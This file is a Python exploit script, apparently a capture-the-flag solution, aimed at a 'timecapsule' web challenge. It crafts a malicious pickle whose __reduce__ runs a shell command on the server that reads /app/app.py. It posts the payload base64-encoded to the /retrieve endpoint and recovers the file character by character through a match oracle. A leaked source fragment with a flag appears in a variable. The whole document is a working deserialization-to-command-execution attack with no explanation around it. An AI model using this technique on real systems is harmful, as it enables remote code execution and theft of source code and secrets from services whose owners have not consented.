#!/usr/bin/env python3
import pickle
import base64
import subprocess
import requests
import time

import string


leak = "from flask import Flask, request, render_template, jsonify, sessionimport pickleimport base64import osimport hashlibimport timefrom datetime import datetimeapp = Flask(__name__)app.secret_key = os.urandom(24)# Store time capsules in memory (in production would use database)time_capsules = {}# Admin vault containing the flagADMIN_VAULT = {    'title': 'Company Secret Vault',    'message': 'shellmates{TiM3_tR4vEL_D3$3RIal1ZaT10N_Hack}"

while True: 
    found = False
    for c in "()$@!$}!#':_= {"+string.ascii_letters+string.digits+'}.':
        print(f"Trying character: {c} (current leak: {leak})")

        CMD_ARGS = ["sh", "-c", f'tr -d "\\n" < /app/app.py | head -c {len(leak)+1} | grep -q "^{leak+c}" && echo Matched || asdf']
        # CMD_ARGS = ["sh", "-c", f'tr -d "\\n" < /app/app.py | head -c {228+len(leak)+1} | tail -c {len(leak)+1}  | grep -q "^{leak+c}" && echo Matched || asdf']

        TARGET_URL  = "https://timecapsule.hackini25.shellmates.club/retrieve"


        class TimeCapsule:
            def __reduce__(self):

                return (subprocess.check_output, (CMD_ARGS,))

        def generate_payload():
            capsule = TimeCapsule()
            pickled = pickle.dumps(capsule)
            return base64.b64encode(pickled).decode()

        b64_payload = generate_payload()

        headers = {"Content-Type": "application/json"}
        start = time.time()
        try:
            res = requests.post(
                TARGET_URL,
                json={"capsule_data": b64_payload},
                headers=headers,
                timeout=10
            )
            if "true" in res.text:
                found = True
                leak += c
                print(f"Found character: {c} (current leak: {leak})")
                break
            else:
                print(res.text)
        except Exception as e:
            print(f"\nRequest failed: {e}")
    if not found:
        print("exiting")
        exit(0)
